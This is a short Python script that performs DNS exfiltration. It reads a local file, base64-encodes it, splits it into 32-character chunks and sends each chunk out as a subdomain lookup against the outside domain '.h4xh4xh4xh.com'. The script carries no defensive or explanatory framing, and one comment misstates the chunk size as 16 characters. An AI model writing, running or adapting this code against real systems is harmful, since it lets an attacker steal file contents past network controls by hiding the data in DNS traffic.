

import base64 
import socket
import dns.resolver

dns.resolver.Timeout = 1
dns.resolver.lifetime = 1

DOMAIN = ".h4xh4xh4xh.com"

data = open('data.txt', 'rb') #open binary file in read mode
data_read = data.read()
encodedBytes = base64.b64encode(data_read)
encodedStr = str(encodedBytes, "utf-8")

parse = [encodedStr[i:i+32] for i in range(0, len(encodedStr), 32)] #breaks the base64 text file into 16 character chunks and passes to parse

ctr = 0
for chunk in parse:
    ret = (parse[ctr]+DOMAIN)
    try:
        print(dns.resolver.query(parse[ctr]+DOMAIN))
    except (dns.resolver.NoAnswer):
        print("Couldn't find any records (NoAnswer)")
    except (dns.resolver.NXDOMAIN):
        print("Couldn't find any records (NXDOMAIN): " + parse[ctr]+DOMAIN)
    ctr = ctr + 1